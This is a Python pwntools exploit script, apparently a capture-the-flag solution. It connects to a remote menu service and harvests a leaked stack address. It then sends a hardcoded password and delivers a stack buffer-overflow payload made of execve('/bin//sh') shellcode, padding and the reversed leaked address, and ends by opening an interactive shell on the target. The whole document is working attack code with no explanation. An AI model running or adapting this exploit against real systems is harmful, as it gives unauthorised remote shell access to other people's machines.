#!/usr/bin/python
from pwn import *
import time
import getopt
import sys

opts,argv=getopt.getopt(sys.argv[1:], 't:p:')

for k,v in opts:
    if k == '-t':
        target=v
    elif k == '-p':
        port=v

password=b"b4tp@$$w0rd!"
shellcode=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

io=remote(target, port)
response=str(io.recvuntil(b">"),'utf-8')
print (response)

io.sendline(b"1")
print ("> We sent 1\n")

response=str(io.recvuntil(b"\n"),'utf-8')
print (response.strip())

address=response.split(': ',1)
address=address[1].lstrip('0x')
print ("> Address is "+address)

byte_array=bytearray.fromhex(address)
byte_array=byte_array[::-1]

response=str(io.recvuntil(b">"),'utf-8')
print (response.strip())

io.sendline(b"2")
print ("> We sent 2\n")

response=str(io.recvuntil(b":"),'utf-8')
print (response.strip())

io.sendline(password)
print ("> Password sent\n")

response=str(io.recvuntil(b":"),'utf-8')
print (response.strip())

payload=shellcode
payload+=b"A"*61
payload+=byte_array
payload+=b"\0\0"

io.sendline(payload)
print ("> Payload sent\n")

response=str(io.recvuntil(b">"),'utf-8')
print (response.strip())

io.sendline(b"3")
print ("> We sent 3\n")

io.interactive()
